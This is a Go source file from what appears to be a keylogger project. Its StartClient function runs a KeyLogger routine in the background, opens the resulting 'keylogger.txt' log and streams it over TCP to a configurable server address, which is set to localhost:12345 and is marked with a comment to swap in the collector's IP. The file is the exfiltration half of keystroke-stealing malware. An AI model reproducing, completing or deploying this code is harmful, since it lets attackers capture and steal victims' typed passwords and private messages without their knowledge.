package client

import (
	"fmt"
	"io"
	"net"
	"os"
)

func StartClient() {
	// Replace "server_ip" with the IP address or hostname of the server.
	serverAddress := "localhost:12345"

	// Create a channel to signal when the file has been sent
	fileSent := make(chan struct{})

	// Start the logger in the background
	go func() {
		// Create logs and save to a file
		KeyLogger()

		// Once the logs are created, signal that the file is ready to be sent
		fileSent <- struct{}{}
	}()

	// Wait for the signal to send the file
	<-fileSent

	// Open the file you want to send
	file, err := os.Open("keylogger.txt")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// Connect to the server
	conn, err := net.Dial("tcp", serverAddress)
	if err != nil {
		fmt.Println("Error connecting to the server:", err)
		return
	}
	defer conn.Close()

	// Copy the file to the network connection
	_, err = io.Copy(conn, file)
	if err != nil {
		fmt.Println("Error sending file:", err)
		return
	}

	fmt.Println("File sent to the server.")
}
